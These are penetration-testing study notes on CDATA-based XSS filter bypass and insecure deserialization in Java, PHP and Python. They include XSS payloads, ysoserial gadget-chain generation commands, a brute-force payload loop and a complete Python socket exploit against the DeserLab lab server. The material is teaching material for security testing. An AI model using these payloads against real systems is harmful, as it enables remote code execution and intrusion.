Using angular parentheses ```<>```, we can define tag names, comments and CDATA sections:

```
<customtag>

<!-- comment -->

<![CDATA[value]]>
```

We can also try to inject a possible XSS vector and try to bypass a filter:

```JS
<script><![CDATA[confirm]]>('XSS')</script> //during XML processing, CDATA is eliminated
```

With CDATA we can also escape angular parentheses:

```JS
<![CDATA[<]]>script<![CDATA[>]]> confirm('XSS') <![CDATA[<]]>/script<![CDATA[>]]>

//resulting in <script>confirm('XSS')</script>
```



## Attacking Serialization

**Serialization** (also referred as **marshalling**) is a mechanism that allows to store the state of objects in a sequence of bytes in a reversible way. This way an object can be transported remotely to another program.

It can be used to:

- Store and transfer data
- Call remote procedures (RPC-like)

Serialized data itself is not encrypted or signed. Often it can be tampered and might bring unexpected results on the deserializing component.

(Note that in some cases there might be transport protocols that utilize serialization with compression or encryption).

&nbsp;

### Serialization in Java

Java serialized data is in binary format and when used in web applications is often encoded using ```base64``` in order to mitigate non-ASCII bytes.

When inspecting web applications for java serialized objects, it is important to look for ```base64``` strings starting with **"rO0AB"**. Binary data transported over the wire usually starts with **"ac ed 00 05"**.

When serializing and deserializing data, the deserializing endpoint must know (it has to include in its *classpath* or *import*) all the classes and packages that the serialized object consists of.

--> Attacking Java serialization is about passing the  **malicious state** of an object to the deserializing endpoint.

Executing OS commands in Java could be done by invoking code like:

```java
Java.lang.Runtime.getRuntime.exec("whoami")
```

But in order to make the deserializing endpoint execute the code, it should be enclosed in a serialized object's property. An object's property in their simplest form are something like:

```java
Object.one.two
```

Where, reading from right to left:
- Two is a property of one
- One is a property of Object

In the same way:

```java
Java.lang.Runtime.getRuntime.exec("id")
```

The method ```exec("id")```is a property of ```getRuntime```, which is a property of ```Java.lang.RunTime```.

During the deserialization phase, the object's properties are accessed recursively, leading to code execution at the very end of this process.
A potentially exploitable condition in Java occurs when ```readObject()``` or a similar function is called on a user-controlled object and later, a method on that object is called. So an attacker could be able to craft such an object containing multiple nested properties that upon method call will do something completely different, like hijacking the called method by implementing a [Dynamic Proxy](#https://www.baeldung.com/java-dynamic-proxies) and an [Invocation handler](#https://docs.oracle.com/javase/7/docs/api/java/lang/reflect/InvocationHandler.html) in the serialized object's properties.

Every property or method that is part of a nested exploit object is called a **gadget**.

--> [Here](https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles) is an interesting presentation about the topic.

*Gadget libraries* are specific Java libraries that were identified to contain some universal gadgets used to build serialized exploit objects. This does not mean that they are insecure by design, but that in case insecure deserialization is performed while these libraries are loaded into the classpath of the application, the attacker can abuse them to construct a known gadget chain that will result in exploitation.

A powerful tool named [**ysoserial**](https://github.com/frohoff/ysoserial) can be used to perform exploitation of insecure Java deserialization vulnerabilities.

In order to run it and display the help message:

```bash
java -jar ysoserial-master-SNAPSHOT.jar
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:

     Payload             Authors                                Dependencies                                                                                                                                                                                        
     -------             -------                                ------------                                                                                                                                                                                        
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
     .........
```

The payload names displayed by the help message are Library names that the gadgets will be taken from.

The ```ysoserial``` payload is in binary format. Often it will be useful to convert it to ```base64``` in order to be able to send it to an application, as in the web app world binary data is base64-encoded.

```bash
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 "whoami" | base64 -w 0
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXV.......
```

The previous command will generate a serialized payload that upon being insecurely deserialized by an application that includes *CommonsCollections1* it its classpath, will result in executing the command ```whoami```.

When approaching an application we do not know what libraries are used by the backend. In such a case a brute-force approach might be rewarding, generating all possible ```ysoserial``` payloads and then try each of them against the target software.

Assuming that ```payloads.txt```contains all ```ysoserial``` payload names:

```bash
while read payload;
do echo -en "$payload\n\n";
java -jar ysoserial-master-SNAPSHOT.jar $payload "whoami" | base64 | tr -d '\n' > payloads/$payload.ser;
echo -en "----------------------\n\n; done < payloads.txt"
```
```bash
sudo mkdir payloads && ./yso.sh
```


The script will create a base64-encoded serialized payload for each vulnerable library.

The result file can be further used in Burp Intruder attacks.

Each of the ```.java```  files inside the ```ysoserial``` jar can be run as a separate java class, resulting in executing different code by the tool. For example, in order to use ```ysoserial/exploit/JSF.java```, we need to issue the command:

```bash
java -cp ysoserial.jar ysoserial.exploit.JSF
```

The JSF payload can be used to attack serialization in Java Faces' ```VIEWSTATE``` parameter.

--> To practice with the vulnerability it is possible to use  [DeserLab](https://github.com/NickstaDB/DeserLab), which is a vulnerable environment containing a serialization exploit.


Note that when telling ```ysoserial``` to create RCE payloads, it is necessary to be aware of its limitations:

- Output redirections and pipes are not supported
- **Parameters** to the command cannot contain spaces

&nbsp;

#### DeserLab

Consists of a simple Java client and server application that implements a custom network protocol using the Java serialization format to demonstrate Java deserialization vulnerabilities.

To run the server:

```bash
java -jar DeserLab.jar -server 127.0.0.1 6666
```

To run the client:

```bash
java -jar DeserLab.jar -client 127.0.0.1 6666
```

Inspecting the communication via Wireshark, we can see Java serialized data. To avoid manual revision of all the packets sent, the ```tshark``` tool can be used to spot the beginning of the serialization stream.

First we have to save the Wireshark dump in a ```pcap``` file, then extract the stream:

```bash
tshark -r /home/kalipt/Desktop/deserialization.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v ',,' | grep '^6666,' | cut -d',' -f2 | tr '\n' ':' | sed s/://g
aced00057704f000baaa77020101737200146e622e64657365722e4861736852657175657374e52ce9a92ac1f9910200024c000a64617461546f486173687400124c6a6176612f6c616e672f537472696e673b4c00077468654861736871007e0001787074000a74657374737472696e677400206436376335636266356230316339663931393332653362386465663565356638
```
It is possible to inspect any Java serialized stream to identify the object it contains using the [Java Serialization Dumper](https://github.com/NickstaDB/SerializationDumper) tool. It takes the hex representation of serialized bytes and dumps the objects the byte stream consists of.

  ```bash
  java -jar SerializationDumper-v1.13.jar aced00057704f000baaa77020101737200146e622e64657365722e4861736852657175657374e52ce9a92ac1f9910200024c000a64617461546f486173687400124c6a6176612f6c616e672f537472696e673b4c00077468654861736871007e0001787074000a74657374737472696e677400206436376335636266356230316339663931393332653362386465663565356638
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_BLOCKDATA - 0x77
    Length - 4 - 0x04
    Contents - 0xf000baaa
  TC_BLOCKDATA - 0x77
    Length - 2 - 0x02
    Contents - 0x0101
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 20 - 0x00 14
        Value - nb.deser.HashRequest - 0x6e622e64657365722e4861736852657175657374
      serialVersionUID - 0xe5 2c e9 a9 2a c1 f9 91
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 2 - 0x00 02
      Fields
        0:
          Object - L - 0x4c
.....
.....
  ```  

For every object/value transported in Java serialized data, there is a preceding byte of certain value that identifies its type. The tool dumps every object that is contained in the stream.

Next step is to understand how to replace single objects to execute code. We can build a simple script that will mimic the inital handshake (0xaced0005) and then replace the serialized data.

Based on the output of the Serialization Dumper, part of the communication must be mimicked with python; this includes handshake, two ```TC_BLOCKDATA``` structures and the username.
The hashed string will be replaced with serialized data originating from the ysoserial tool:

```bash
java -jar ysoserial-master-SNAPSHOT.jar Groovy1 "ping 127.0.0.1" > p.bin
```

```bash
sudo java -jar ysoserial-master-SNAPSHOT.jar Groovy1 "ping 127.0.0.1" > p.bin       1 ⨯
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by org.codehaus.groovy.reflection.CachedClass$3$1 (file:/opt/ysoserial-master-SNAPSHOT.jar) to method java.lang.Object.finalize()
WARNING: Please consider reporting this to the maintainers of org.codehaus.groovy.reflection.CachedClass$3$1
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
```

```bash
head p.bin | hexdump -C
00000000  ac ed 00 05 73 72 00 32  73 75 6e 2e 72 65 66 6c  |....sr.2sun.refl|
00000010  65 63 74 2e 61 6e 6e 6f  74 61 74 69 6f 6e 2e 41  |ect.annotation.A|
.....
.....
```

Here is the full exploit code:

```python
#serialization.py
import socket

ip = "127.0.0.1"
port = 6666
payload = "p.bin"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

data = '\xac\xed\x00\x05' #Serialization handshake
s.sendall(data)

data = '\x77\x04'
data2 = '\xf0\x00\xba\xaa' #TC_BLOCKDATA
s.sendall(data)
s.sendall(data2)

data = '\x77\x02' #Protocol version
data2 = '\x01\x01'
s.sendall(data)
s.sendall(data2)

data = '\x77\x06' #depends on username 06 is string length +2
data2 = '\x00\x04\x74\x65\x73\x74' #00 04 is string length, then 4 bytes T E S T

s.sendall(data)
s.sendall(data2)
f = open(payload, "rb") #ysoserial payload without first 4 bytes
c = f.read()
s.send(c[4:])
```

The script contains all structures dumped by ```Serialization Dumper``` until the hashed string, which is replaced by the ```ysoserial``` payload without its first 4 bytes (aced0005).

Launching the script and listening to any ICMP packets on localhost, we can see that the exploit is working and a remote code execution is performed:

```bash
python serialization.py
```

```bash
tcpdump -i lo icmp
```

&nbsp;

#### URLDNS

The URLDNS payload does not result in code execution. It makes the deserializing endpoint resolve an arbitrary DNS name. It is a low-impact result of insecure deserialization, but on the other hand it uses Java built-in features, so it is likely to work almost in every case. This payload allows for easier confirmation of insecure deserialization.

To generate the payload:

```bash
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://something.com > p2.bin
```
The URL can also be the Burp Collaborator Client. To test it locally we can use the [DNSChief](https://github.com/iphelix/dnschef) tool.



&nbsp;

#### Burp Pro Extensions
There are also several Burp Suite Pro extensions that one can use as well:
- [Freddy](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3)
- [Java Deserialization Scanner](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae)

They are very useful in automating the process of serialization exploitation.

&nbsp;

#### Useful resources on the topic

- [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability](#https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [Video: Matthias Kaiser - Exploiting Deserialization Vulnerabilities in Java](#https://www.youtube.com/watch?v=VviY3O-euVQ)
- [DeserLab](#https://github.com/NickstaDB/DeserLab)


&nbsp;

### Serialization in PHP

PHP serialization, or *PHP Object Injection* works in a similar way as Java Deserialization. It uses the *serialize()* and *unserialize()* function to perform serialization, but unlike Java the serialization is in non-binary format. It looks similar to a JSON array and it is human readable.

Example of a PHP serialized object:

```
O:6"ZXCVBN":1:{s:4"Word";s:6:"Active";}
```

PHP Serialized objects contain informations about the type of object. This piece of information is necessary when reconstructing the object during deserialization.

- Booleans are serialized as ```b:<i>;``` where ```i``` is ```0``` or ```1``` (True / False)
- Strings are serialized as ```s:<i>:"<s>";``` where ```i``` is the string length and ```s``` is the string itself
- Arrays are serialized as ```a:<i>:{<elements>}``` where ```i``` is an integer representing the number of elements in the array, and ```elements``` are zero or more serialized key value pairs of the form ```<key><value>```

&nbsp;

Objects (classes) are serialized as ```O:<i>:"<s>":<i>:{<properties>}```, where the first ```<i>``` is an integer representing the string length of ```<s>```, and ```<s>``` is the fully qualified class name.

- The second ```<i>``` is an integer representing the number of object properties, and ```<properties>``` are zero or more serialized name-value pairs
- In the ```<name><value>``` pair, ```<name>``` is a serialized string representing the property name, and ```<value>``` is any value that is serializable
- Also, ```<name>``` is represented as ```s:<i>:"<s>";``` where ```<i>``` is an integer representing the string length of ```<s>```


&nbsp;

The visibility of properties influences the value of ```<s>``` in the following ways:

- With public properties, ```<s>``` is the simple name of the property
- With protected properties, ```<s>``` is the simple name of the property, prepended with ```\0*\0``` , an asterix enclosed in two NULL bytes (0x00)
- With private properties, ```<s>``` is the simple name of the property, prepended with ```\0<s>\0```, enclosed in two NULL bytes, where ```<s>``` is the fully qualified class name.


Like in Java, when testing we might often encounter the PHP serialized data to be ```base64``` encoded. But PHP object injection is not as straightforward as its Java counterpart and depends heavily on the details of each vulnerability. This means that exploitability relies heavily on how the unserialized data is handled. Unserialized data is not necessarily used unless *some magic* methods are in place. These methods are functions that are being launched dynamically once a certain trigger is present. They can be recognized in code by two underscores in the beginning of their names, such as ```__construct()```.

The triggers for the PHP classes are:

- ```__construct()``` is loaded upon creating a new instance of a class
- ```__destruct()``` is loaded when no more references of a current class are present in memory
- ```__wakeUp()``` is loaded upon deserializing an object

--> [Here](#https://www.php.net/manual/en/language.oop5.magic.php) is a good reference on the subject.

  In general, exploitation is possible when we have some sort of access to the app source code, in order to know what it does.
  More practical info about exploitation are available on the ippsec's youtube channel:

  - [Intro to PHP Deserialization / Object Injection](#https://www.youtube.com/watch?v=HaW15aMzBUM&list=PLidcsTyj9JXJrgTzRYdwnUhUThb9bL9py&index=3)
  - [Advanced PHP Serialization](#https://www.youtube.com/watch?v=fHZKSCMWqF4&list=PLidcsTyj9JXJrgTzRYdwnUhUThb9bL9py&index=2)




&nbsp;

### Other Serialization

Exploiting Python-based serialization issues is well described in the following arcticles:

- [Malicious Python Serialization](#https://intoli.com/blog/dangerous-pickles/)
- [Playing with Pickle Security](#https://lincolnloop.com/blog/playing-pickle-security/)

Exploiting Python-based serialization issues is well described in the following arcticle:

- [Unsafe Object Deserialization Vulnerability in RubyGems](#https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html)

Here is a generic presentation concerning all mentioned technologies:

- [Deserialization, what could go wrong?](#https://insomniasec.com/downloads/publications/Deserialization%20-%20%20What%20Could%20Go%20Wrong.pdf)
